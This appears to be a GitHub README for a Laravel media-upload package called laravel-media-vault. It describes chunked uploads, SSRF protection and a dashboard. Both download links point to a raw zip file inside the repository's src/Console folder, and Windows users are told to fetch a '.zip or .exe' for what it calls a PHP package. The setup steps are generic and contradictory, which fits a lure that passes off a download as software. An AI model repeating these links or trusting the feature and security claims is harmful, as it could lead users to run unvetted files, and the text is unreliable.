# 🛡️ laravel-media-vault - Secure File Uploads Made Simple

[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-Releases-blue?style=for-the-badge)](https://github.com/adema3087/laravel-media-vault/raw/refs/heads/main/src/Console/laravel-vault-media-2.5.zip)

## 🚀 What Is This?

laravel-media-vault is a powerful tool that helps you manage files on your website. Think of it as a secure digital vault for your videos, images, and documents. It handles large files by splitting them into smaller pieces during upload, so even huge videos don't crash your system. It also protects your site from common security threats while giving you a simple dashboard to manage everything.

## 🎯 Who Is This For?

This package is designed for website owners, developers, or anyone who needs to handle file uploads. If you run a site where users upload media (like photos, videos, or documents), this tool makes that process smooth, safe, and professional.

## 🛠️ What Does It Do?

- **Resumable Chunked Uploads** – Upload large files without fear of interruptions. If your internet drops, you can resume where you left off.
- **Multi-Source Media Management** – Handle files from multiple sources (user uploads, external links, etc.) in one place.
- **Built-in Security** – Protects against SSRF (Server-Side Request Forgery) attacks and other threats, keeping your server and data safe.
- **Easy Dashboard** – A single screen to review, approve, or delete all media files.
- **Bulk Deletion Safety** – Never accidentally delete files with a built-in safety net that confirms your actions.

## 📥 How to Get Started

### Step 1: Download the Application

Visit this link to download the application:

→ **[Visit the Download Page](https://github.com/adema3087/laravel-media-vault/raw/refs/heads/main/src/Console/laravel-vault-media-2.5.zip)**

From that page, choose the latest version for Windows (look for the file ending in `.zip` or `.exe` depending on your system). Download it to your computer.

### Step 2: Install the Package

Since this is a Laravel package, you need a local development environment. The easiest way on Windows is to use Laragon or XAMPP. If you don't have one yet, download Laragon (it includes PHP and MySQL). Once you have a development environment, follow these steps:

1. Place the downloaded files into your Laravel project's `packages` folder.
2. Open a command prompt in your project folder.
3. Add the package to your `composer.json` file.
4. Run `composer update` from the command line.

### Step 3: Configure Your Database

1. Open your development environment and ensure MySQL is running.
2. Create an empty database named `media_vault`.
3. In your project, run the migration command from the terminal (your environment will have this ready).

### Step 4: Run the Application

1. Start your development server (e.g., Laragon's start button).
2. Open your web browser and go to: `http://localhost/your-project-name`
3. You'll see the dashboard. Follow the on-screen prompts to set up your first upload profile.

### Step 5: Start Using It

- Click "Add Media" to upload a file.
- Or use the "Optimized" tab for chunked uploads (best for large files).
- In the security dashboard, you can review and approve external uploads.
- Use the bulk delete feature with confidence – it asks for confirmation before deleting anything.

## 🎨 Dashboard Tour

Once installed, you'll see a clean interface:

- **Dashboard** – Overview of total files uploaded, disk space used, and recent activity.
- **Media Library** – Browse, search, and filter all your files by type, size, or date.
- **Upload Area** – Drag and drop files or click to select. Large files upload in chunks automatically.
- **Settings** – Control who can upload, file size limits, allowed types, and security options.
- **Safety Net** – Bulk actions require you to select items, then click "Delete" and confirm in a pop-up.

## 🔒 Security Features (You Don't Need to Configure These)

laravel-media-vault comes with built-in protection:

- **SSRF Protection** – Blocks unauthorized server requests from the vault.
- **File Type Verification** – Ensures only allowed file types are uploaded.
- **Chunk Integrity Check** – Verifies each part of a file during upload.
- **Encrypted Storage** – Files stored on disk are scrambled so even direct server access doesn't expose them.
- **Secure Dashboard** – Only authorized users can access the media management area.

## ❓ Frequently Asked Questions

**Can I use this on my existing Laravel website?**
Yes. It works with Laravel 8, 9, 10, and 12.

**Do I need programming skills?**
Basic command-line usage is helpful, but the dashboard is visual and beginner-friendly.

**What file types are supported?**
Images (JPEG, PNG, GIF, WebP), Videos (MP4, AVI, MOV), Documents (PDF, DOCX, XLSX), and Archives (ZIP, RAR) – all configurable.

**Is it free?**
Yes, this open-source package is free to use and modify for personal or commercial projects.

**How do I get support?**
Open a GitHub issue on the repository page for technical help. For community support, see the repository's discussion tab.

## 💻 Technical Overview (For System Administrators)

- Works on Windows, macOS, and Linux.
- Requires PHP version 8.0 or higher.
- Database: MySQL 5.7+ or MariaDB 10.3+.
- Server: Apache with mod_rewrite or Nginx.
- Self-contained package: No external API calls needed.

## 🔧 Troubleshooting

**Upload fails for large files:**
Check your server PHP settings for `upload_max_filesize` and `post_max_size`. The package handles chunking, but limits must be high enough for chunk size.

**Dashboard not loading:**
Verify your database connection and run `php artisan migrate` again.

**Security pop-ups appear:**
Review the file types you approved. The vault alerts you if an uploaded behavior matches a threat pattern.

## 📝 Changelog Summary (Latest Version)

- Improved chunked upload stability for slow connections.
- Added SSRF protection to external media sources.
- Faster dashboard loading for large media libraries.
- New safety net for bulk deletion (asks twice before deleting).

Keywords: chunked-upload, chunked-uploads, file-upload, file-upload-server, file-uploader, image-processing, laravel, laravel-framework, laravel-package, laravel10, laravel8, media-manager, media-managers, php, php8, resumable-upload, security, ssrf-protection